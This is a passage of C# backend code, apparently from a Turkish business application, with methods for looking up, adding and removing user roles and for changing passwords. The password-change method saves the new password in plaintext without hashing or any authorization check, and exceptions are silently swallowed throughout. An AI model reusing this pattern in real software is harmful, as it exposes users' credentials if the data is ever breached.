        public Gn_Category GetGroupByUserId(Int32 uid)
        {
            try
            {
                Gn_DepartmentRoles odr = _departmentRules.Where(k => k.Id == uid).FirstOrDefault();
                if (odr != null)
                {
                    Gn_Category d = _userGroups.Where(k => k.Id == odr.GroupId).FirstOrDefault();
                    return d;
                }
                return null;
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public bool UpdateUser(Gn_User user)
        {
            try
            {
                _user.Update(user);
                return true;
            }
            catch (Exception ex)
            {
                // implement logging..
                return false;
            }
        }

        public List<RoleWrapper> GetRolesAll()
        {
            try
            {
                List<Gn_DepartmentRoles> depRoles = _departmentRules.All().ToList();
                List<RoleWrapper> target = new List<RoleWrapper>();
                foreach (Gn_DepartmentRoles dr in depRoles)
                {
                    Gn_Department dep = _departments.Where(k => k.Id == dr.DepartmentId).FirstOrDefault();
                    string depName = dep != null ? dep.DepartmentName : "Genel";
                    int depId = dep != null ? dep.Id : 0;
                    Gn_Role role = _rules.Where(k => k.Id == dr.RuleId).FirstOrDefault();
                    string roleName = role != null ? role.RuleName : "Genel";
                    int roleId = role != null ? role.Id : 0;
                    Gn_Category groupe = _userGroups.Where(k => k.Id == dr.GroupId).FirstOrDefault();
                    string groupeName = groupe != null ? groupe.Title : "Genel";
                    int groupeId = groupe != null ? groupe.Id : 0;
                    target.Add(
                        new RoleWrapper()
                        {
                            DepartmentId = depId,
                            DepartmentName = depName,
                            RuleName = roleName,
                            RuleId = roleId,
                            GroupId = groupeId,
                            GroupName = groupeName,
                            DgoId = dr.Id,
                            FullName = groupeName + " - " + depName + " - " + roleName
                        });
                }

                return target;
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public List<RoleWrapper> GetRolesByUserId(int uid)
        {
            try
            {
                List<Gn_UserRoles> userRole = _userRules.Where(m => m.UserId == uid).ToList();
                List<RoleWrapper> target = new List<RoleWrapper>();
                foreach (Gn_UserRoles gnUserRoles in userRole)
                {
                    Gn_DepartmentRoles departmanRole = _departmentRules.Where(m => m.Id == gnUserRoles.DepartmentRuleId).FirstOrDefault();

                    string depName = "";
                    if (departmanRole.DepartmentId != null)
                        depName = _departments.Where(m => m.Id == departmanRole.DepartmentId).FirstOrDefault().DepartmentName;

                    var role = _rules.Where(m => m.Id == departmanRole.RuleId.Value).FirstOrDefault();
                    Gn_Category group = null;
                    if (departmanRole.GroupId != null)
                        group = _userGroups.Where(m => m.Id == departmanRole.GroupId.Value).FirstOrDefault();
                    var area = _areas.Where(m => m.Id == gnUserRoles.AreaId.Value).FirstOrDefault();
                    string areaName = string.Empty;
                    int areaId = 0;
                    if (area != null)
                    {
                        areaName = area.AreaName;
                        areaId = area.Id;
                    }
                    var item = new RoleWrapper();
                    item.DepartmentId = departmanRole.DepartmentId != null
                        ? Convert.ToInt32(departmanRole.DepartmentId)
                        : 0;
                    item.DepartmentName = depName;
                    item.RuleName = role.RuleName;
                    item.RuleId = role.Id;
                    item.GroupId = group != null ? group.Id : 0;
                    item.GroupName = group != null ? group.Title : "";
                    item.DgoId = Convert.ToInt32(gnUserRoles.DepartmentRuleId);
                    item.FullName = group?.Title + " - " + depName + " - " + role.RuleName + " - " + areaName + " (" +
                                    areaId + ")";
                    target.Add(
                        item);
                }

                return target;
                //List<Gn_DepartmentRoles> depRoles = _departmentRules.All().ToList();
                //List<RoleWrapper> target = new List<RoleWrapper>();
                //foreach (Gn_DepartmentRoles dr in depRoles)
                //{
                //    Gn_Department dep = _departments.Where(k => k.Id == dr.DepartmentId).FirstOrDefault();
                //    string depName = dep != null ? dep.DepartmentName : "Genel";
                //    int depId = dep != null ? dep.Id : 0;
                //    Gn_Role role = _rules.Where(k => k.Id == dr.RuleId).FirstOrDefault();
                //    string roleName = role != null ? role.RuleName : "Genel";
                //    int roleId = role != null ? role.Id : 0;
                //    Gn_Category groupe = _userGroups.Where(k => k.Id == dr.GroupId).FirstOrDefault();
                //    string groupeName = groupe != null ? groupe.Title : "Genel";
                //    int groupeId = groupe != null ? groupe.Id : 0;
                //    List<Gn_UserRoles> ours = _userRules.Where(k => k.DepartmentRuleId == dr.Id).ToList();
                //    foreach (Gn_UserRoles or in ours)
                //    {
                //        Gn_Area are = _areas.Where(k => k.Id == or.AreaId).FirstOrDefault();
                //        string area = "Genel";
                //        int areaId = 0;
                //        if (are != null)
                //        {
                //            area = are.AreaName;
                //            areaId = are.Id;
                //        }
                //        target.Add(
                //            new RoleWrapper()
                //            {
                //                DepartmentId = depId,
                //                DepartmentName = depName,
                //                RuleName = roleName,
                //                RuleId = roleId,
                //                GroupId = groupeId,
                //                GroupName = groupeName,
                //                DgoId = dr.Id,
                //                FullName = groupeName + " - " + depName + " - " + roleName + " - " + area + " (" + areaId + ")"
                //            });
                //    }
                //}

                //Gn_User user = _user.Where(k => k.Id == uid).FirstOrDefault();
                //List<int?> oneRuleDgIds = _userRules.Where(k => k.UserId == user.Id).Select(m => m.DepartmentRuleId).ToList();
                //var list = target.Where(k => oneRuleDgIds.Contains(k.DgoId)).ToList();
                // return list;
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public RoleWrapper AddRole(int drid, int? area, int uid)
        {
            try
            {
                if (area == 0)
                    area = null;

                _userRules.Insert(new Gn_UserRoles()
                {
                    AreaId = area,
                    UserId = uid,
                    DepartmentRuleId = drid,
                });

                Gn_DepartmentRoles drules = _departmentRules.Where(k => k.Id == drid).FirstOrDefault();
                Gn_Department dep = _departments.Where(k => k.Id == drules.DepartmentId).FirstOrDefault();
                string depName = dep != null ? dep.DepartmentName : "Genel";
                int depId = dep != null ? dep.Id : 0;
                Gn_Role role = _rules.Where(k => k.Id == drules.RuleId).FirstOrDefault();
                string roleName = role != null ? role.RuleName : "Genel";
                int roleId = role != null ? role.Id : 0;
                Gn_Category groupe = _userGroups.Where(k => k.Id == drules.GroupId).FirstOrDefault();
                string groupeName = groupe != null ? groupe.Title : "Genel";
                int groupeId = groupe != null ? groupe.Id : 0;

                Gn_Area arei = _areas.Where(k => k.Id == area).FirstOrDefault();
                string area1 = "Genel";
                int areaId = 0;
                if (arei != null)
                {
                    area1 = arei.AreaName;
                    areaId = arei.Id;
                }

                RoleWrapper rw =
                    new RoleWrapper()
                    {
                        DepartmentId = depId,
                        DepartmentName = depName,
                        RuleName = roleName,
                        RuleId = roleId,
                        GroupId = groupeId,
                        GroupName = groupeName,
                        DgoId = drules.Id,
                        FullName = groupeName + " - " + depName + " - " + roleName + " - " + area + " (" + areaId + ")"
                    };
                return rw;
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public bool RemoveRole(int drid, int? area, int uid)
        {
            try
            {
                int? dridid = (Int32?)drid;
                int? uidid = null;
                if (uid > 0)
                    uidid = (int?)uid;
                int? areaid = null;
                if (area > 0)
                    areaid = (int?)area;
                List<Gn_UserRoles> urs = _userRules.Where(k => k.DepartmentRuleId == dridid && k.AreaId == areaid && k.UserId == uidid).ToList();
                foreach (Gn_UserRoles ur in urs)
                    _userRules.Delete(ur);
                return true;
            }
            catch (Exception ex)
            {
                // implement logging..
                return false;
            }
        }

        public bool UserPasswordChange(int UserId, string Password, string Password2)
        {
            if (Password == Password2)
            {
                Gn_User user = _user.Where(k => k.Id == UserId).FirstOrDefault();
                if (user != null)
                {
                    user.Password = Password;
                    _uow.SaveChanges();
                }
                else
                {
                    throw new Exception("Kullanici bulunamadi");
                }
            }

            return true;
        }

        public List<Gn_ConnectionChannel> ListConnectionChannel()
        {
            return _connectionChannel.Where(m => m.Active).ToList();
        }
    }
}